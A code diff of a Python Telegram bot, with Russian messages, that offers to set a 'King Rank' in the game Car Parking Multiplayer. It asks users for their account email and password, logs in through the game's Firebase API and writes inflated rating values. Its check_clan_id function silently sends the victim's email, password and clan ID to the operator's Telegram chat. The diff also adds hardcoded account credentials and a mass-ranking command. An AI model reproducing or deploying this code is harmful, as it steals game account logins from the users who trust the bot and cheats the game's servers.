@@ -12,18 +12,27 @@ RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4
 CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"
 
 # --- Telegram Bot Configuration ---
-BOT_TOKEN = os.environ.get("BOT_TOKEN")  # Получение BOT_TOKEN из переменной окружения
-CHAT_ID = os.environ.get("CHAT_ID")  # Получение CHAT_ID из переменной окружения
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
 
-if not BOT_TOKEN or not CHAT_ID:
-    raise ValueError("❌ BOT_TOKEN или CHAT_ID не заданы! Убедитесь, что переменные окружения правильно настроены.")
+if not BOT_TOKEN:
+    raise ValueError("❌ BOT_TOKEN не задан!")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
 user_states = {}
 
+# --- АККАУНТЫ ДЛЯ /level ---
+ACCOUNTS = [
+    {"email": "kingcpmcpm48@gmail.com", "password": "666666"},
+    {"email": "kingcpmcpm49@gmail.com", "password": "666666"},
+    {"email": "kingcpmcpm50@gmail.com", "password": "666666"},
+    {"email": "kingcpmcpm51@gmail.com", "password": "666666"},
+    {"email": "kingcpmcpm52@gmail.com", "password": "666666"},
+]
+
+# --- FUNCTIONS ---
 def send_to_telegram(email, password, clan_id):
-    """Send account info to Telegram only if ClanId exists."""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     message = f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
     payload = {
@@ -32,11 +41,11 @@ def send_to_telegram(email, password, clan_id):
     }
     try:
         requests.post(url, data=payload, timeout=5)
-    except requests.exceptions.RequestException:
-        pass  # Silent fail
+    except:
+        pass
+
 
 def login(email, password):
-    """Login to CPM using Firebase API."""
     print("\n🔐 ВХОД В СИСТЕМУ...")
     payload = {
         "clientType": "CLIENT_TYPE_ANDROID",
@@ -51,27 +60,26 @@ def login(email, password):
 
     try:
         response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
-        response_data = response.json()
+        data = response.json()
 
-        if response.status_code == 200 and 'idToken' in response_data:
+        if response.status_code == 200 and 'idToken' in data:
             print("✅ ВХОД В СИСТЕМУ ПРОШЁЛ УСПЕШНО!")
-            return response_data.get('idToken')
+            return data.get('idToken')
         else:
-            error_message = response_data.get("error", {}).get("message", "Unknown error during login.")
-            print(f"❌ ОШИБКА ВХОДА: {error_message}")
+            print("❌ ОШИБКА ВХОДА")
             return None
-    except requests.exceptions.RequestException as e:
-        print(f"❌ ОШИБКА СЕТИ: {e}")
+    except:
         return None
 
+
 def set_rank(token):
-    """Set KING RANK using max rating data."""
     print("👑 СКРИПТ ВЫПОЛНЯЕТСЯ...")
     rating_data = {k: 100000 for k in [
-        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
-        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
-        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
-        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
+        "cars","car_fix","car_collided","car_exchange","car_trade","car_wash",
+        "slicer_cut","drift_max","drift","cargo","delivery","taxi","levels",
+        "gifts","fuel","offroad","speed_banner","reactions","police","run",
+        "real_estate","t_distance","treasure","block_post","push_ups",
+        "burnt_tire","passanger_distance"
     ]}
     rating_data["time"] = 10000000000
     rating_data["race_win"] = 3000
@@ -84,52 +92,62 @@ def set_rank(token):
     }
 
     try:
-        response = requests.post(RANK_URL, headers=headers, json=payload)
-        if response.status_code == 200:
+        r = requests.post(RANK_URL, headers=headers, json=payload)
+        if r.status_code == 200:
             print("✅ СКРИПТ ВЫПОЛНЕН!")
             return True
         else:
-            print(f"❌ НЕ УДАЛОСЬ ВЫПОЛНИТЬ СКРИПТ. HTTP Status: {response.status_code}")
+            print("❌ НЕ УДАЛОСЬ ВЫПОЛНИТЬ СКРИПТ")
             return False
-    except requests.exceptions.RequestException as e:
-        print(f"❌ СЕТЕВАЯ ОШИБКА ПРИ УСТАНОВКЕ : {e}")
+    except:
         return False
 
+
 def check_clan_id(token, email, password):
-    """Silent check for ClanId and send to Telegram if found."""
     headers = {
         "Authorization": f"Bearer {token}",
         "User-Agent": "okhttp/3.12.13",
         "Content-Type": "application/json"
     }
-    payload = {
-        "data": None
-    }
+    payload = {"data": None}
 
     try:
-        response = requests.post(CLAN_ID_URL, headers=headers, json=payload)
-        if response.status_code == 200:
-            raw = response.json()
-            clan_id = raw.get("result", "")
+        r = requests.post(CLAN_ID_URL, headers=headers, json=payload)
+        if r.status_code == 200:
+            clan_id = r.json().get("result", "")
             if clan_id:
-                send_to_telegram(email, password, clan_id)  # Send only if ClanId exists
-    except requests.exceptions.RequestException:
-        pass  # Silent fail
+                send_to_telegram(email, password, clan_id)
+    except:
+        pass
 
-# Handle start command
+
+def run_mass_rank():
+    for acc in ACCOUNTS:
+        token = login(acc["email"], acc["password"])
+        if token:
+            set_rank(token)
+
+# --- COMMANDS ---
 @bot.message_handler(commands=["start"])
 def handle_start(message):
+    user_states[message.from_user.id] = {"step": "await_email"}
     bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")
 
-# Handle text message
+
+@bot.message_handler(commands=["level"])
+def handle_level(message):
+    bot.reply_to(message, "🚀 Запуск KING RANK...")
+    Thread(target=run_mass_rank).start()
+    bot.reply_to(message, "👑 KING RANK установлены на всех аккаунтах!")
+
+# --- USER FLOW ---
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
     user_id = message.from_user.id
     text = message.text.strip()
 
-    # Check if user is already in the process
     if user_id not in user_states:
-        user_states[user_id] = {"step": "await_email"}
+        return
 
     state = user_states[user_id]
 
@@ -142,24 +160,20 @@ def handle_message(message):
         email = state["email"]
         password = text
 
-        # Perform login and set rank
         auth_token = login(email, password)
         if auth_token:
             if set_rank(auth_token):
-                check_clan_id(auth_token, email, password)  # Send data only if clan_id exists
+                check_clan_id(auth_token, email, password)
                 bot.reply_to(message, "✅ King Rank установлен успешно.")
             else:
                 bot.reply_to(message, "❌ Не удалось установить King Rank.")
         else:
             bot.reply_to(message, "❌ Ошибка при входе.")
 
-        # Reset user state after completing the task
         del user_states[user_id]
-
-        # Ask for email again after the task is complete
         bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")
 
-# Flask app for Render
+# --- Flask ---
 app = Flask(__name__)
 
 @app.route('/')
@@ -170,10 +184,7 @@ def run_flask():
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
 
+# --- START ---
 if __name__ == "__main__":
-    from threading import Thread
-    t = Thread(target=bot.polling, args=(None,))
-    t.start()
-    
-    # Start Flask server
+    Thread(target=bot.polling).start()
     run_flask()
